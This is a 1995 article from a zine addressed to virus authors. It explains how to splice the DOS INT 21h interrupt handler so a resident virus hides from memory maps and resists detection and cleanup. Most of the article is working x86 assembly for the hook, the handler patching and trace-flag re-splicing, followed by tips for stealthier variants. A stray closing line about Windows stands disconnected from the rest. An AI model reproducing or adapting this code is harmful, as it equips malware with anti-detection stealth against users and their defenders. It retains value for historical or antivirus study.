	   ÜÜ                  Û
	  ßßß Monthly Magazine Û For VirMakers.                  JULY '95
	  ßÛÛ ßßßßßßßßßßßßßßßß Û ßßßßßßßßßßßßßßßßßßß ß ßßßßÞßßß  ÛßßßßßßÛ
	   ÞÛ ÛßÜ Ûßß Üßß Üßß ÜÛÜ Üßß ÛßÛ    Ý Û ÜßÛ Û Üßß ÛÜÜ   Û ÞßßÛ Û
	    Û Û Û Ûß  Ûß  Û    Û  Ûß  Û Û    Û Û Û Û Û Û   Û     Û   ÞÝ Û
	    Û Þ Þ Þ   ÞÜÜ ÞÜÜ  Þ  ÞÜÜ ÞÜß     ßÛ ßÜÛ Þ ÞÜÜ ÞÜÜÜ  Û   Û  Û
	    Þ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ  ÛÜÜÜÜÜÜÛ
	   (C) STEALTH group WWide, Box 10, Kiev-148, fUcKRAINE
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
			 Classic Splicing of INT 21h.
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

					       (c) IntMaster-1995

	A Virus' lifetime depends first of all on it's ability to
   hide it's presence in memory.

   Splicing is the one of good inventions in this field.
   Introduced here is classic splicing - changing the beginning of the
   interrupt handler to a JMP FAR VIR_HANDLER instruction.

   Thus, the interrupt table remains the same and a memory map no longer
   displays that the interrupt is handled by a certain virus' RAM block.

   It becames HARDER to detect and cure the virus, so survival is greater.
   It is more useful to insert your JMP into the original DOS handler - read
   an article about tunneling.

	The virus interrupt handler has the following scheme:

	       ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
	       ³ Restore DOS handler for use. ³
	       ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
			     \³/
	       ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
	       ³       All virus stuff.       ³
	       ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
			     \³/
	       ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
	       ³   Splice DOS handler back.   ³
	       ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


	It's important to know that some DOS functions, for example
   00h,4ch,31h don't return the execution to the original point.
   So splicing is not such as easy as it seems at first glance and
   some special techniques must be used. In this article I correct the DOS 
   handler by tracing a the first couple of commands.

   Here is some splicing code:

	1. When installing in memory.

	; ds -> VirSeg - virus segment
	;_seg_:_ofs_ -> original int 21h handler

	mov word ptr es:[4*79h+2],VirSeg     ; Install our
	mov word ptr es:[4*79h],offset int79 ; int 79h handler

	les di,ds:[_ofs_]            ; First 2 bytes of int 21h
	mov ax,word ptr es:[di]      ; now - {INT 79h}
	mov word ptr ds:[s21h],ax
	mov word ptr es:[di],079cdh  ; int 79h

	2. Int 79h handler.

 @21_   proc     ; Procedure to call the original int 21h
	pushf
	db 9ah
 _ofs_: dw ?
 _seg_: dw ?
	ret
 @21_   endp

 ; Beginning of int 79h handler
 int79: push ax di es
	cld
	les di,cs:[_ofs_-entry] ;Restore
	mov ax,0000h            ;int 21h handler
	org $-2
 s21h   dw ?
	stosw
	pop es di ax

	;...............................................
	; Here is all the virus stuff ...
	; If you want to call int 21
	; use call @21_
	;...............................................

	; ...

	; In the end of the handler use:

	jmp end21

 end21  proc
	push dx es ds
	xor dx,dx
	mov es,dx
	lds dx,es:[4]             ; save  int 1 vector
	mov cs:[int1of],dx
	mov cs:[int1sg],ds
	mov word ptr es:[4],int1_ ; Install our int 1
	mov word ptr es:[6],cs
	pop ds es dx
	push bp
	mov bp,sp
	sub word ptr [bp+2],2    ;Correct return point
				 ;(it is in stack after call
				 ; int 79h)
	or word ptr [bp+6],0100h ;Set trace flag on
				 ;in the saved flag register
	pop bp
	iret                     ;Return execution to int 21h
				 ;Trace of interrupt handler beginning
 end21  endp

 int1_  proc
	push ax
	push bp
	mov bp,sp
	mov ax,word ptr cs:[_ofs_]
	inc ax
	cmp ax,word ptr [bp+4]  ;Have first 2 bytes executed ?
	je next                 ;Then insert {int 79h} instruction
	push es di si ds
	les di,cs:[_ofs_]
	mov word ptr es:[di],079cdh ; = {int 79h}

	xor di,di
	mov es,di
	lds si,cs:[int1of]    ;Restore int 1 vector
	mov es:[4],si
	mov es:[6],ds
	pop ds si di es

	and word ptr [bp+8],0feffh  ;Clear trace flag
 next:  pop bp
	pop ax
	iret
 int1of dw ?     ; Storage for original int 1 vector
 int1sg dw ?
 int1_  endp


   P.S. It's easy to see that the algorithm can be improved . For example:
 
	1. In place of { int 79h } instruction { jmp <virus> } may be placed
	   (then interrupt table remains unchanged).

	2. { jmp <virus> } instruction to the virus may be inserted 
	   in the middle of the interrupt body.


	Microsoft Windows (if virii installed before running win.com).

<<<<<<<<<<<<<<<<<<<<<<<<<< THAT'S ALL FOLKS! >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
